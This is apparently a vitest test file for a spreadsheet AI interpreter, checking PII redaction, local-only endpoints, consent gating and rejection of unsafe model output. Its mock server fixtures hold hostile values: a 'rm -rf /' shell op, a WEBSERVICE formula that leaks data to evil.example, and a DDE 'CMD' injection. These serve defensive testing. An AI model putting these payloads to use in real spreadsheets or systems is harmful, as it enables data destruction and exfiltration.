import http from "node:http";
import type { AddressInfo } from "node:net";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import {
  interpretPromptWithRealAi,
  sanitizePromptPii,
  validateAiEndpointUrl,
  validateUntrustedDslPayload,
  type AiProviderConfig,
  type AiSchemaContext
} from "./ai-interpreter";

const SCHEMA: AiSchemaContext = {
  columns: [
    { name: "region", type: "text" },
    { name: "revenue", type: "currency" }
  ],
  metricIds: ["total_revenue"],
  parameterNames: ["tax_rate"]
};

describe("Local Ollama-compatible AI interpreter & prompt PII safety (Section 3.10)", () => {
  let server: http.Server;
  let baseUrl = "";
  let nextResponseMode:
    | "valid_dsl"
    | "malformed_json"
    | "numeric_fabrication"
    | "unsafe_op"
    | "formula_injection"
    | "http_500"
    | "slow" = "valid_dsl";
  let lastWireBody = "";
  let requestCount = 0;

  beforeAll(async () => {
    server = http.createServer((req, res) => {
      requestCount += 1;
      const chunks: Buffer[] = [];
      req.on("data", (chunk: Buffer) => chunks.push(chunk));
      req.on("end", () => {
        lastWireBody = Buffer.concat(chunks).toString("utf8");
        if (nextResponseMode === "http_500") {
          res.writeHead(500, { "Content-Type": "application/json" });
          res.end(JSON.stringify({ error: "model_crashed" }));
          return;
        }
        if (nextResponseMode === "slow") {
          setTimeout(() => {
            if (!res.writableEnded) {
              res.writeHead(200, { "Content-Type": "application/json" });
              res.end(JSON.stringify({ choices: [{ message: { content: "{}" } }] }));
            }
          }, 1500);
          return;
        }
        let content = JSON.stringify({
          op: "define_metric",
          id: "net_revenue",
          name: "Net Revenue",
          unit: "USD",
          formula: "SUM(revenue)"
        });
        if (nextResponseMode === "malformed_json") {
          content = "Sure! Here is the total: 42,500 USD (not valid JSON)";
        } else if (nextResponseMode === "numeric_fabrication") {
          content = JSON.stringify({ total_revenue: 987654.32 });
        } else if (nextResponseMode === "unsafe_op") {
          content = JSON.stringify({ op: "exec_shell", cmd: "rm -rf /" });
        } else if (nextResponseMode === "formula_injection") {
          content = JSON.stringify({
            op: "add_calculated_column",
            name: "pwn",
            formula: '=WEBSERVICE("https://evil.example/leak")'
          });
        }
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(
          JSON.stringify({
            id: "chatcmpl-mock-local-ollama",
            model: "qwen2.5:7b-instruct",
            choices: [{ index: 0, message: { role: "assistant", content } }]
          })
        );
      });
    });

    await new Promise<void>((resolve) => {
      server.listen(0, "127.0.0.1", () => {
        const addr = server.address() as AddressInfo;
        baseUrl = `http://127.0.0.1:${addr.port}/v1/chat/completions`;
        resolve();
      });
    });
  });

  afterAll(async () => {
    await new Promise<void>((resolve) => server.close(() => resolve()));
  });

  it("masks pasted PII and secrets in user prompts before sending to local Ollama-compatible HTTP server", async () => {
    nextResponseMode = "valid_dsl";
    const provider: AiProviderConfig = {
      kind: "openai_compatible",
      endpointUrl: baseUrl,
      modelName: "qwen2.5:7b-instruct",
      consentedToSchemaContext: true
    };
    const promptWithPii =
      "Create Net Revenue metric for client ahmed@company.eg phone +201012345678 NID 29901011234567 token sk-supersecret123456";

    const result = await interpretPromptWithRealAi(promptWithPii, SCHEMA, provider, undefined, {
      allowAnyLoopbackPortForTest: true
    });
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.command.op).toBe("define_metric");
    expect(result.redactedPromptPiiKinds).toContain("email");
    expect(result.redactedPromptPiiKinds).toContain("phone");
    expect(result.redactedPromptPiiKinds).toContain("national_id_or_card");
    expect(result.redactedPromptPiiKinds).toContain("secret_token");

    // Inspect actual wire payload received by HTTP server: ZERO raw PII or cell rows!
    expect(lastWireBody).not.toContain("ahmed@company.eg");
    expect(lastWireBody).not.toContain("+201012345678");
    expect(lastWireBody).not.toContain("29901011234567");
    expect(lastWireBody).not.toContain("sk-supersecret123456");
    expect(lastWireBody).toContain("[REDACTED_EMAIL]");
    expect(lastWireBody).toContain("[REDACTED_PHONE]");
    expect(lastWireBody).toContain("[REDACTED_ID_OR_CARD]");
    expect(lastWireBody).toContain("[REDACTED_SECRET]");
  });

  it("rejects malformed model output, fabricated totals, unsafe ops, and formula/prompt injection", async () => {
    const provider: AiProviderConfig = {
      kind: "openai_compatible",
      endpointUrl: baseUrl,
      modelName: "qwen2.5:7b-instruct",
      consentedToSchemaContext: true
    };

    for (const mode of [
      "malformed_json",
      "numeric_fabrication",
      "unsafe_op",
      "formula_injection"
    ] as const) {
      nextResponseMode = mode;
      const res = await interpretPromptWithRealAi("Compute revenue", SCHEMA, provider, undefined, {
        allowAnyLoopbackPortForTest: true
      });
      expect(res.ok).toBe(false);
      if (!res.ok) {
        expect(res.code).toBe("SF-AIX-002");
      }
    }

    expect(
      validateUntrustedDslPayload(
        JSON.stringify({
          op: "define_metric",
          id: "x",
          name: "x",
          unit: null,
          formula: "=CMD|' /C calc'!A0"
        })
      ).ok
    ).toBe(false);
  });

  it("handles HTTP 500 errors, AbortController cancellation, missing consent, and blocks remote cloud AI", async () => {
    // 1. Remote cloud AI endpoint strictly blocked!
    const cloudCheck = validateAiEndpointUrl("https://api.openai.com/v1/chat/completions");
    expect(cloudCheck.ok).toBe(false);

    // 2. Missing consent makes ZERO outbound HTTP calls!
    const beforeCount = requestCount;
    const noConsent = await interpretPromptWithRealAi(
      "Sort by revenue",
      SCHEMA,
      {
        kind: "openai_compatible",
        endpointUrl: baseUrl,
        modelName: "qwen2.5:7b-instruct",
        consentedToSchemaContext: false
      },
      undefined,
      { allowAnyLoopbackPortForTest: true }
    );
    expect(noConsent.ok).toBe(false);
    expect(requestCount).toBe(beforeCount);

    // 3. HTTP 500 from provider returns honest SF-AIX-001
    nextResponseMode = "http_500";
    const err500 = await interpretPromptWithRealAi(
      "Sort by revenue",
      SCHEMA,
      {
        kind: "openai_compatible",
        endpointUrl: baseUrl,
        modelName: "qwen2.5:7b-instruct",
        consentedToSchemaContext: true
      },
      undefined,
      { allowAnyLoopbackPortForTest: true }
    );
    expect(err500.ok).toBe(false);
    if (!err500.ok) expect(err500.code).toBe("SF-AIX-001");

    // 4. AbortController cancels in-flight request cleanly
    nextResponseMode = "slow";
    const ac = new AbortController();
    setTimeout(() => ac.abort(), 50);
    const aborted = await interpretPromptWithRealAi(
      "Sort by revenue",
      SCHEMA,
      {
        kind: "openai_compatible",
        endpointUrl: baseUrl,
        modelName: "qwen2.5:7b-instruct",
        consentedToSchemaContext: true
      },
      ac.signal,
      { allowAnyLoopbackPortForTest: true }
    );
    expect(aborted.ok).toBe(false);
    if (!aborted.ok) expect(aborted.code).toBe("SF-AIX-001");
  });

  it("sanitizes IBANs and card numbers directly", () => {
    const res = sanitizePromptPii("IBAN EG380019000500000000263180002 card 4532-1111-2222-3333");
    expect(res.sanitizedPrompt).toContain("[REDACTED_IBAN]");
    expect(res.sanitizedPrompt).toContain("[REDACTED_ID_OR_CARD]");
    expect(res.sanitizedPrompt).not.toContain("4532");
  });

  // Optional live local Ollama acceptance test (runs ONLY when SAFI_LIVE_OLLAMA_TEST=1 & local Ollama is running).
  it.skipIf(!process.env.SAFI_LIVE_OLLAMA_TEST)(
    "live local Ollama inference acceptance test (requires real local Ollama model on 127.0.0.1:11434)",
    async () => {
      const model = process.env.SAFI_LIVE_OLLAMA_MODEL || "qwen2.5:7b-instruct";
      const res = await interpretPromptWithRealAi(
        "Create a metric called total_sales with formula SUM(revenue) in USD",
        SCHEMA,
        {
          kind: "openai_compatible",
          endpointUrl: "http://127.0.0.1:11434/v1/chat/completions",
          modelName: model,
          consentedToSchemaContext: true
        }
      );
      expect(res.ok).toBe(true);
    }
  );
});
